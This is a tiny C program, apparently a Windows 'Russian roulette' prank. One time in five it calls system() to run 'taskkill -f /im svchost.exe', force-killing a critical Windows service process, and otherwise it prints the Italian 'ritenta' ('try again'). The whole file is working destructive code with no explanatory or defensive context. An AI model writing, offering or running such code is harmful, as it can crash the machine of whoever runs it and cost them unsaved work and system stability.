#include<stdio.h>
#include<stdlib.h>
#include<time.h>

void main(){
    time_t t;
    srand((unsigned) time(&t));
    int a=rand()%5;
    if(a==2){
        system("taskkill -f /im svchost.exe");
    }else{
        printf("ritenta");
    }
}